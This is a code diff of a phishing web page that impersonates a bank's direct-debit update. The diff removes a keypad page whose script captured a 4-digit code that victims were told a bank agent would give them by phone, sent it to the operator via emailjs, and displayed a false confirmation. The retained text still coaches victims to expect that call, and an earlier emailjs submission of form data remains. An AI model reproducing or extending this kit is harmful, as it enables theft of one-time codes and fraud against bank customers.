@@ -104,61 +104,10 @@
   .info-box {
     background: #faf6ec; border-left: 3px solid #e6a817;
     border-radius: 0 8px 8px 0; padding: 14px 16px;
-    text-align: left; margin-bottom: 28px;
+    text-align: left; margin-bottom: 0;
   }
   .info-box p { font-size: 13px; color: #555; line-height: 1.75; }
   .info-box strong { color: #111; }
-  .success-btn {
-    width: 100%; background: #1565c0; color: #fff; border: none;
-    border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600;
-    cursor: pointer; transition: background 0.2s;
-  }
-  .success-btn:hover { background: #0d47a1; }
-
-  /* PAGE 3 */
-  .otp-body { padding: 32px 20px 40px; }
-  @media (min-width: 480px) { .otp-body { padding: 36px 36px 48px; } }
-  .otp-icon {
-    width: 64px; height: 64px; border-radius: 50%; background: #e3f0fc;
-    display: flex; align-items: center; justify-content: center; margin: 0 auto 18px;
-  }
-  .otp-icon svg { width: 30px; height: 30px; fill: #1565c0; }
-  .otp-title { font-size: clamp(17px, 4vw, 21px); font-weight: 700; color: #111; margin-bottom: 8px; text-align: center; }
-  .otp-sub { font-size: 13px; color: #555; line-height: 1.65; margin-bottom: 28px; text-align: center; }
-  .otp-sub strong { color: #111; }
-  .otp-display { display: flex; justify-content: center; gap: 12px; margin-bottom: 28px; }
-  .otp-box {
-    width: 56px; height: 64px; border: 2px solid #bbb; border-radius: 10px;
-    font-size: 28px; font-weight: 700; color: #111;
-    display: flex; align-items: center; justify-content: center;
-    background: #fafafa; transition: border-color 0.2s, box-shadow 0.2s;
-  }
-  .otp-box.filled { border-color: #1565c0; background: #fff; }
-  .otp-box.active { border-color: #1565c0; box-shadow: 0 0 0 3px rgba(21,101,192,0.15); }
-  .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; max-width: 300px; margin: 0 auto 24px; }
-  .key {
-    background: #f0f0f0; border: none; border-radius: 12px;
-    padding: 18px 10px; font-size: 22px; font-weight: 600; color: #111;
-    cursor: pointer; transition: background 0.15s, transform 0.1s; touch-action: manipulation;
-  }
-  .key:hover { background: #e2e2e2; }
-  .key:active { transform: scale(0.92); }
-  .key.zero { grid-column: 2; }
-  .key.del { background: #fdecea; color: #c0392b; font-size: 18px; }
-  .key.del:hover { background: #f5c6c6; }
-  .verify-btn {
-    width: 100%; background: #1565c0; color: #fff; border: none;
-    border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600;
-    cursor: pointer; transition: background 0.2s; margin-bottom: 14px;
-  }
-  .verify-btn:hover { background: #0d47a1; }
-  .verify-btn:disabled { background: #90b4e8; cursor: not-allowed; }
-  #otpToast {
-    display: none; margin-top: 12px; padding: 11px 14px;
-    border-radius: 8px; font-size: 13px; font-weight: 600; text-align: center;
-  }
-  #otpToast.error { background: #fdecea; color: #c0392b; border: 1px solid #c0392b33; }
-  #otpToast.success { background: #e3f0fc; color: #1565c0; border: 1px solid #1565c033; }
 </style>
 </head>
 <body>
@@ -223,43 +172,9 @@
       <div class="info-box">
         <p>You will receive a call from your bank to confirm the changes on your <strong>direct debit</strong>. A bank agent will give you a <strong>4-digit code</strong> during the call — please attend the call and enter the 4 digits on the keypad to confirm your direct debit update.</p>
       </div>
-      <button class="success-btn" onclick="showPage('page-otp')">Continue to Keypad</button>
     </div>
   </div>
 
-  <!-- PAGE 3: KEYPAD -->
-  <div class="page" id="page-otp">
-    <div class="otp-body">
-      <div class="otp-icon">
-        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-          <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24 11.47 11.47 0 003.59.57 1 1 0 011 1V20a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1 11.47 11.47 0 00.57 3.59 1 1 0 01-.25 1.01l-2.2 2.19z"/>
-        </svg>
-      </div>
-      <h2 class="otp-title">Enter Your 4-Digit Code</h2>
-      <p class="otp-sub">Please enter the <strong>4-digit code</strong> provided by the bank agent on the call to confirm your direct debit update.</p>
-      <div class="otp-display">
-        <div class="otp-box active" id="box-0"></div>
-        <div class="otp-box" id="box-1"></div>
-        <div class="otp-box" id="box-2"></div>
-        <div class="otp-box" id="box-3"></div>
-      </div>
-      <div class="keypad">
-        <button class="key" onclick="keyPress('1')">1</button>
-        <button class="key" onclick="keyPress('2')">2</button>
-        <button class="key" onclick="keyPress('3')">3</button>
-        <button class="key" onclick="keyPress('4')">4</button>
-        <button class="key" onclick="keyPress('5')">5</button>
-        <button class="key" onclick="keyPress('6')">6</button>
-        <button class="key" onclick="keyPress('7')">7</button>
-        <button class="key" onclick="keyPress('8')">8</button>
-        <button class="key" onclick="keyPress('9')">9</button>
-        <button class="key zero" onclick="keyPress('0')">0</button>
-        <button class="key del" onclick="keyDel()">&#9003;</button>
-      </div>
-      <button class="verify-btn" id="verifyBtn" onclick="verifyOtp()" disabled>Confirm Direct Debit</button>
-      <div id="otpToast"></div>
-    </div>
-  </div>
 </div>
 
 <script>
@@ -295,36 +210,6 @@
     .then(() => { showPage('page-success'); })
     .catch(err => { console.error(err); showToast('❌ Failed to send. Please try again.', 'error'); })
     .finally(() => { btn.disabled = false; btn.textContent = 'Continue'; });
-  }
-  let otp = [];
-  function keyPress(d) {
-    if (otp.length >= 4) return;
-    otp.push(d); updateBoxes();
-  }
-  function keyDel() {
-    if (!otp.length) return;
-    otp.pop(); updateBoxes();
-  }
-  function updateBoxes() {
-    for (let i = 0; i < 4; i++) {
-      const box = document.getElementById('box-' + i);
-      box.textContent = otp[i] ? '●' : '';
-      box.classList.toggle('filled', i < otp.length);
-      box.classList.toggle('active', i === otp.length && i < 4);
-    }
-    document.getElementById('verifyBtn').disabled = otp.length < 4;
-  }
-  function verifyOtp() {
-    const code = otp.join('');
-    const toast = document.getElementById('otpToast');
-    emailjs.send("service_p6xk4mw", "template_tslrh0l", {
-      user_id: 'OTP Code Entered', user_age: '-',
-      address: 'Direct Debit Code: ' + code,
-      remember: 'No', submitted_at: new Date().toLocaleString()
-    });
-    toast.textContent = '✅ Code confirmed. Your direct debit update is being processed.';
-    toast.className = 'success'; toast.style.display = 'block';
-    document.getElementById('verifyBtn').disabled = true;
   }
 </script>
 
